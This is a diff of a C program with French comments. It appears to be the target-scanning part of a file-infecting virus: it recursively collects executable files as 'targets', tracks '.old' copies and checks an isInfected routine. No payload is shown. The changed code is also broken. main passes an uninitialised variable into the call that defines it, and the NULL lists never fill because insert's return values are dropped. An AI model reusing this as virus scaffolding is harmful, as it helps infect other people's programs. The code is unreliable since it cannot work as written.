@@ -118,14 +118,12 @@ bool    deleteItem(List *list, Element *deleteItem) {
     return true;
 }
 
-List* recursiveResearch(char* PATH, int cibles){
+List* recursiveResearch(List* fichiers, List* old, char* PATH, int cibles){
     DIR *dirp;
     struct dirent *entry;
     struct stat s;
 
     dirp = opendir(PATH);
-    List *fichiers = NULL;
-    List *old = NULL;
     char fichier[500];
 
     while ((entry = readdir(dirp)) != NULL) {
@@ -135,37 +133,35 @@ List* recursiveResearch(char* PATH, int cibles){
 
         if (stat(fichier, &s) != -1) {
             if (S_ISDIR(s.st_mode) && !strstr(entry->d_name,".") && !strstr(entry->d_name,"..") && cibles < NB_CIBLES ) {
-                recursiveResearch(fichier, cibles);
+                recursiveResearch(fichiers, old, fichier, cibles);
             }
             if ((s.st_mode & S_IXUSR) && (s.st_mode & S_IFREG)){
                 if (!strstr(entry->d_name,".old") && cibles < NB_CIBLES) //->Passe avec "MonPg1.old.qqch" ou ".olderFile" (. étant le fichier caché)
                 {
                     //printf("Fichier : %s\n", fichier);
-                    fichiers = insert(fichiers, fichier);
+                    insert(fichiers, fichier);
                     cibles++;
                 } 
                 else
                 {
-                    old = insert(old, fichier);
+                    insert(old, fichier);
                 }
             }
         }
     }
 
-    if (fichiers)
+   if (fichiers)
     {
         Element *actuel = fichiers->p;
         while (actuel != NULL)
         {
-            //printf("%s\n", actuel->fichier);
-            if (isInfected(actuel->fichier, old)){
-                deleteItem(fichiers, actuel);
-            }
+            printf("%s\n", actuel->fichier);
+            //if (isInfected(actuel->fichier, old)){
+            //    deleteItem(fichiers, actuel);
+            //}
             actuel = actuel->prev;
         }
     }
-
-    printList(fichiers);
     return fichiers;
 }
 
@@ -176,7 +172,8 @@ int main(){
         return EXIT_FAILURE;
     }
 
-    List* cibles = recursiveResearch(PATH, 0);
+    List* old = NULL;
+    List* cibles = recursiveResearch(cibles, old, PATH, 0);
 
     //printList(cibles);
     return EXIT_SUCCESS;
